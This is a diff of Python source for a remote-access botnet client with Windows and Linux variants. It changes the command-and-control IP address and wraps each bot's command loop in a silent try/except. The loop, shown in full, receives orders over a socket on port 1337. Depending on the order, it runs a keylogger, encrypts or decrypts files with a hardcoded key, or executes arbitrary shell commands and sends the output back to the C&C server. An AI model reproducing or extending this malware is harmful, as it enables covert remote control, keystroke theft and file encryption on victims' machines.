@@ -23,7 +23,7 @@ except ImportError as e:
 
 #  CONSTANTS  #
 FILENAME = __file__[2:]
-IP = "172.17.0.1" # IP address to connect to.
+IP = "192.168.31.134" # IP address to connect to.
 PORT = 1337 # Port number to create socket with.
 DIRECTORY = "/tmp/.folder" # Hidden folder to create for our keylogger.
 KEY = "Where's the money?" # Encryption key... :)
@@ -202,21 +202,23 @@ class WindowsBot:
 				None
 		"""
 		sock = create_client_socket() # Store socket object.
-		with sock:
-			while True:
-				command = sock.recv(COMMMAND_SIZE).decode('utf-8') # Receive command from server.
-				command_output = None
-				if command == 'keylog':
-					command_output = keylogger()
-				elif command[:7] == 'encrypt':
-					command_output = crypto(command[:7], command[8:])
-				elif command[:7] == 'decrypt':
-					command_output = crypto(command[7:], command[8:].split())
-				else:
-					command_output = self.exec_windows_cmd(command) # Execute command on machine and store the response.
-				sock.send(bytes(str(command_output), 'utf-8')) # Send the output to the C&C server.
+		try:
+			with sock:
+				while True:
+					command = sock.recv(COMMMAND_SIZE).decode('utf-8') # Receive command from server.
+					command_output = None
+					if command == 'keylog':
+						command_output = keylogger()
+					elif command[:7] == 'encrypt':
+						command_output = crypto(command[:7], command[8:])
+					elif command[:7] == 'decrypt':
+						command_output = crypto(command[7:], command[8:].split())
+					else:
+						command_output = self.exec_windows_cmd(command) # Execute command on machine and store the response.
+					sock.send(bytes(str(command_output), 'utf-8')) # Send the output to the C&C server.
+		except:
+			exit(1)
 
-		
 """ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """
 
 class LinuxBot:
@@ -254,19 +256,22 @@ class LinuxBot:
 				None
 		"""
 		sock = create_client_socket() # Store socket object.
-		with sock:
-			while True:
-				command = sock.recv(COMMMAND_SIZE).decode('utf-8') # Receive command from server.
-				command_output = None
-				if command == 'keylog':
-					command_output = keylogger()
-				elif command[:7] == 'encrypt':
-					command_output = crypto(command[:7], command[8:])
-				elif command[:7] == 'decrypt':
-					command_output = crypto(command[7:], command[8:].split())
-				else:
-					command_output = self.exec_linux_cmd(command) # Execute command on machine and store the response.
-				sock.send(bytes(str(command_output), 'utf-8')) # Send the output to the C&C server.
+		try:
+			with sock:
+				while True:
+					command = sock.recv(COMMMAND_SIZE).decode('utf-8') # Receive command from server.
+					command_output = None
+					if command == 'keylog':
+						command_output = keylogger()
+					elif command[:7] == 'encrypt':
+						command_output = crypto(command[:7], command[8:])
+					elif command[:7] == 'decrypt':
+						command_output = crypto(command[7:], command[8:].split())
+					else:
+						command_output = self.exec_linux_cmd(command) # Execute command on machine and store the response.
+					sock.send(bytes(str(command_output), 'utf-8')) # Send the output to the C&C server.
+		except:
+			exit(1)
 
 """ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """
 
